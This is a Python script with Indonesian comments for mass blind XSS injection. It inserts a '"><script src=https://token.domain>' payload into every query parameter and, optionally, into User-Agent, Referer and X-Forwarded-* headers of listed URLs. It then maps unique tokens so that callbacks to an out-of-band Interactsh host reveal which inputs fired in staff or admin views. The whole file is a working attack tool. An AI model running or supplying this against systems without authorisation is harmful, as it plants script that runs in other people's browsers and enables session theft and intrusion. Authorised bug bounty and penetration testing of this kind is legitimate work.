#!/usr/bin/env python3
"""
blind_inject.py — Inject payload blind XSS ke semua parameter & header umum.

Blind XSS baru "meledak" saat payload dibuka oleh pihak lain (admin, support
staff, log viewer) di halaman yang tidak bisa kita akses langsung. Karena itu
verifikasinya bukan lewat response langsung, tapi lewat callback ke server
Interactsh — kita cuma perlu menyimpan mapping antara token unik dan URL asal,
lalu polling interactsh secara terpisah untuk lihat mana yang "meledak".

Usage:
    python3 blind_inject.py --urls candidates.txt --output blind_map.json \
        [--interactsh-domain xxxx.oast.fun]

Catatan: jalankan interactsh-client terpisah untuk generate domain unik dan
polling callback:
    interactsh-client -v
"""

import argparse
import json
import uuid
import time
import sys
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests

COMMON_HEADERS_TO_TEST = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "X-Original-URL",
    "X-Client-IP",
]

BLIND_PAYLOAD_TEMPLATE = (
    '"><script src=https://{token}.{interactsh_domain}></script>'
)


def build_payload(token: str, interactsh_domain: str) -> str:
    return BLIND_PAYLOAD_TEMPLATE.format(token=token, interactsh_domain=interactsh_domain)


def inject_into_params(url: str, payload: str) -> str:
    """Sisipkan payload ke SEMUA query parameter pada URL, satu per satu
    (agar mapping token -> parameter jelas saat callback masuk)."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    variants = []

    if not params:
        return url  # tidak ada parameter untuk diinject

    for target_param in params:
        new_params = {k: v[0] for k, v in params.items()}
        new_params[target_param] = payload
        new_query = urlencode(new_params)
        new_url = urlunparse(parsed._replace(query=new_query))
        variants.append((target_param, new_url))

    return variants


def send_with_header_payloads(url: str, payload: str, session: requests.Session,
                               rate_delay: float):
    """Kirim request dengan payload disisipkan di header umum satu per satu."""
    results = []
    for header_name in COMMON_HEADERS_TO_TEST:
        headers = {header_name: payload}
        try:
            session.get(url, headers=headers, timeout=8, verify=False)
            results.append({"type": "header", "header": header_name, "url": url})
        except requests.RequestException:
            pass
        time.sleep(rate_delay)
    return results


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--urls", required=True, help="File berisi list URL kandidat")
    ap.add_argument("--output", required=True, help="File JSON output mapping token")
    ap.add_argument("--interactsh-domain", required=True,
                     help="Domain interactsh dari interactsh-client (mis. xxxx.oast.fun)")
    ap.add_argument("--rate-delay", type=float, default=0.2,
                     help="Jeda antar request (detik) untuk rate limiting")
    ap.add_argument("--inject-headers", action="store_true",
                     help="Sertakan injeksi ke header umum (User-Agent, Referer, dll)")
    args = ap.parse_args()

    urls = [u.strip() for u in Path(args.urls).read_text().splitlines() if u.strip()]

    mapping = {}
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (XSS-Research-Scan)"})

    print(f"[*] Menyiapkan blind payload untuk {len(urls)} URL...")

    for url in urls:
        token = uuid.uuid4().hex[:12]
        payload = build_payload(token, args.interactsh_domain)

        variants = inject_into_params(url, payload)
        if isinstance(variants, str):
            continue  # tidak ada param

        for param_name, injected_url in variants:
            try:
                session.get(injected_url, timeout=8, verify=False)
                mapping[token] = {
                    "type": "param",
                    "url": url,
                    "injected_url": injected_url,
                    "parameter": param_name,
                    "timestamp": time.time(),
                }
                print(f"    [param] {param_name} @ {url} -> token {token}")
            except requests.RequestException as e:
                print(f"    [!] gagal kirim ke {injected_url}: {e}", file=sys.stderr)
            time.sleep(args.rate_delay)

        if args.inject_headers:
            header_token = uuid.uuid4().hex[:12]
            header_payload = build_payload(header_token, args.interactsh_domain)
            send_with_header_payloads(url, header_payload, session, args.rate_delay)
            mapping[header_token] = {
                "type": "header_batch",
                "url": url,
                "timestamp": time.time(),
            }

    Path(args.output).write_text(json.dumps(mapping, indent=2))
    print(f"[✓] Mapping token tersimpan di {args.output}")
    print("[i] Sekarang jalankan interactsh-client -v dan cocokkan token yang")
    print("    'meledak' dengan mapping ini untuk tahu URL/parameter mana yang rentan.")


if __name__ == "__main__":
    main()
